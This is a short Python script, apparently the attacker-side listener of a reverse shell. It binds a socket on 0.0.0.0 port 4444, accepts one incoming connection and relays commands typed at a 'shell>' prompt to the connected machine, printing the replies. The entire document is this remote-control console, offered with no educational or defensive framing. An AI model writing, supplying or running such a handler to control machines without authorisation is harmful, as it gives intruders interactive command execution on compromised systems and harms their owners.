import socket

HOST = '0.0.0.0'
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[*] Listening on {HOST}:{PORT}")

client, addr = server.accept()
print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

while True:
    command = input("shell> ")
    if not command:
        continue
    client.sendall(command.encode())
    data = client.recv(4096).decode()
    print(data, end="")
    continue
